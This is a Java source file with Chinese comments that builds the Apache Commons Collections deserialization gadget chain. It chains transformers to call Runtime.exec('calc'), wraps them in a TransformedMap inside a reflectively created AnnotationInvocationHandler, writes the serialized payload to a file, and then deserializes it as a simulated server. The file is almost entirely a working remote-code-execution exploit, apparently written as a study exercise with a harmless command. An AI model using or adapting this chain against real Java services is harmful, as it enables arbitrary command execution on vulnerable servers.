import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class EvalObject2 {

    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {

        //Runtime.getRuntime().exec()
        //ConstantTransformer ==>返回Runtime Object
        //ChainedTransformer ==>把一个Transformer数组里的每一个变量都循环一遍，然后执行每个变量的transform方法,方法参数为上一个循环的返回值

        //客户端：
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class}, new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})

        };
        Transformer transformer = new ChainedTransformer(transformers);//串在一起

        Map innerMap = new HashMap();
        innerMap.put("value","value");
        Map outerMap = TransformedMap.decorate(innerMap,null,transformer);
        //反射机制调用AnnotationInvocationHandler类的构造函数
        Class cl=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(Class.class,Map.class);
        //取消构造函数修饰符的限制
        ctor.setAccessible(true);
        //获取AnnotationInvocationHandler实例
        Object instance = ctor.newInstance(Target.class,outerMap);
        //payload序列化写入文件
        FileOutputStream fileOutputStream = new FileOutputStream("outTest.cer");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(instance);


        //服务器：
        FileInputStream fileInputStream = new FileInputStream("outTest.cer");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);

        objectInputStream.readObject();
        //反序列化为Map格式
/*        Map outerMap_now = (Map) objectInputStream.readObject();
        outerMap_now.put("123","123");*/
        /*Transformer transformer1 =(Transformer) objectInputStream.readObject();
        transformer1.transform("aa");*/





    }
}
